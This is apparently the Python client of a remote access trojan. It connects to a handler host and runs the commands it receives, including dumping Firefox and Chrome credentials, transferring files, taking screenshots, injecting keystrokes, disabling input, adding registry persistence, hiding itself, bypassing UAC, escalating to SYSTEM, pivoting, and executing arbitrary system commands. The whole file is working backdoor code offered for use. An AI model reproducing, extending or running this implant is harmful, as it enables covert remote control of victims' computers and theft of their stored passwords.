#!/usr/bin/env python

import socket
sock = socket.socket()
from defines import *
# Import commands.

normal_mutex, admin_mutex = mutex.create_mutexes()
mutexes.append(normal_mutex)
mutexes.append(admin_mutex)

parser = argparse.ArgumentParser()
parser.add_argument('--chdir')
parser.add_argument('--welcome_msg')
args = parser.parse_args()

try:
	if args.chdir:
		os.chdir(args.chdir)
except Exception as e:
	with open(r"C:\test\aaaaaaaaaaaaa.txt","w") as f: f.write(str(e))
	
while True:
	try:
		sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
		sock.settimeout(20)
		time.sleep(1)

		while True: # Ungodly mess
			try:
				while True:
					for host in HANDLER_IP:
						try:
							print "connecting to "+host
							sock.connect((host,HANDLER_PORT))
							sock.settimeout(None)
							try:
								communication.send("                "+args.welcome_msg) # Connect and send current directory.
							except:
								communication.send("                ")
							raise Exception("OK!")
							
						except socket.timeout as e:
							print e
							time.sleep(10)
							
						except socket.error as e:
							print e
							time.sleep(10)
							
			except Exception as e:
				if str(e) == "OK!": break

		print "connected"
		try: del args
		except: pass

		while sock:
			data = ""
			#try:
			data = communication.receive()[:-2] # Receive command from handler and remove marker.
			
			if not data:
				raise Exception("dfgdfgdfgdfg") # Professional programming
				break
			
			if data.startswith("PORTFWD_PACKET"):
				pivot.portfwd_queue.put_nowait(data)
				output = "PORTFWD_PACKET:OK"
				
			# CHANGE DIRECTORY COMMAND
			elif data.startswith("cd"): # Change directory
				try:
					os.chdir(data[3:]) 
					output = ""
				except Exception as e:
					output = str(e)
					
			# INFORMATION GATHERING COMMANDS
			elif data.startswith("info"): # Get basic system information.
				output = intel.system_info()
			elif data.startswith("dumpff"): #Dump firefox credentials.
				output = intel.dump_firefox()
			elif data.startswith("dumpchrome"): #Dump chrome credentials.
				curdir = os.getcwd()
				output = intel.dump_chrome()
				os.chdir(curdir)

			# FILE TRANSFER COMMANDS
			elif data.startswith("download"): # Download a file from remote to local.
				communication.download(data.split()[1]) 
				continue
			elif data.startswith("upload"): # Upload file from local to remote.
				communication.upload(data.split()[1])
				continue
			elif data.startswith("downhttp"): # Download a file from a webserver.
				output = communication.download_HTTP(data.split()[1])
				
			# USER INTERACTION COMMANDS
			elif data.startswith("msgbox"): # Show a message box.
				threading.Thread(target=interact.msgbox,args=(data,)).start()
				output = ""
			elif data.startswith("sendkeys"): #Send keys.
				output = interact.send_keys(data.split()[1])
			elif data.startswith("uictl"): # Enable or disable mouse and keyboard.
				output = interact.UICTL(data)
			elif data.startswith("screenshot"):
				output = interact.screenshot()
				
			# PERSISTENCE COMMANDS
			elif data.startswith("persist"): # Add self to registry.
				output = persistence.persist()
			elif data.startswith("hide"): # Change attributes to only writable by SYSTEM, and make file hidden.
				output = persistence.hide_self()
			
			# PRIVILEGE ESCALATION COMMANDS
			elif data.startswith("bypassuac"): # Bypass UAC.
				output = privilege_escalation.bypass_UAC()
			elif data.startswith("getsystem"): # Attempt to get SYSTEM privileges.
				output = privilege_escalation.get_system()
				
			# MIGRATION COMMANDS
			elif data.startswith("appdata"): # Migrate to appdata.
				output = migration.move_to_appdata()
			elif data.startswith("migrate"): # Migrate to any directory.
				output = migration.migrate_ex(data)
			elif data.startswith("chname"): # Change executable name.
				output = migration.rename_self(data)
				
			# PIVOT COMMANDS
			elif data.startswith("pivot"):
				data = data.split()
				command = data[1]
				args = data[2:]
				if command == "add":
					output = pivot.create_pivot(*args)
				elif command == "list":
					output = pivot.list_pivots()
				elif command == "del":
					output = pivot.delete_pivot(args[0])
				
			# HELPER COMMANDS
			elif data.startswith("isadmin"): # Check if current process has admin rights.
				if helpers.is_admin():
					output = "[+]Current process has admin privileges."
				else:
					output = "[-]Current process does not have admin privileges."
					
			elif data.startswith("location"):
				output = EXECUTABLE_PATH
			elif data.startswith("ads"):
				output = ads.fetch_file("test")

			# EXECUTION COMMANDS
			elif data.startswith("startd"): # Start a file as a detached process.
				output = execute.start_detached(data)
			else:
				output = execute.execute_command(data) # execute system command.
				
			communication.send(output) # Send output back to server.
			
	except Exception as e:
		print e # In case of an error, reconnect.
		sock = None
		execute.start_detached(EXECUTABLE_PATH)
		os._exit(0)
		continue